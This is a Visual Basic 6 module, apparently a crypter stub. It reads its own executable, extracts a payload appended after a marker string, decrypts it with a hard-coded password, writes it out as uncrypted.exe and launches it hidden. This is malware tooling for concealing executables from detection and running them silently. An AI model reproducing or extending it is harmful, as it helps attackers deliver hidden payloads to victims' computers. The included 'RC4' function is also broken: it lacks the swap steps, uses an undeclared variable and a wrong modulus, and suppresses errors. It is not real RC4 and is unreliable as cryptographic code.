Attribute VB_Name = "Module1"
Sub Main()
Dim sFile As String 'Variable to load file into
Open App.Path & "\" & App.EXEName & ".exe" For Binary As #1 'opens this exe
    sFile = Space(LOF(1)) 'makes variable space that is lof
    Get #1, , sFile 'imports into var
Close #1 'closes this exe, not end :0

sFile = Split(sFile, "#^#^#")(1) 'remember putting in the random string? this is so we can get the actual file/data that was added to the stub(crypted file)
sFile = RC4(sFile, "password") 'decrypts this file (RC4 is the same for encryption and decryption as long as the pass is the same)

Open App.Path & "\uncrypted.exe" For Binary As #1 'opens file to put decrypted file
    Put #1, , sFile 'puts decrypted file
Close #1 'closes file

Shell App.Path & "\uncrypted.exe", vbHide 'runs file hidden :)
End Sub

Public Function RC4(ByVal Data As String, ByVal Password As String) As String 'rc4 encryption function
On Error Resume Next
Dim F(0 To 255) As Integer, X, Y As Long, Key() As Byte
Key() = StrConv(Password, vbFromUnicode)
For X = 0 To 255
Y = (Y + F(X) + Key(X Mod Len(Password))) Mod 256
F(X) = X
Next X
Key() = StrConv(Data, vbFromUnicode)
For X = 0 To Len(Data)
Y = (Y + F(Y) + 1) Mod 256
Key(X) = Key(X) Xor F(Temp + F((Y + F(Y)) Mod 254))
Next X
RC4 = StrConv(Key, vbUnicode)
End Function

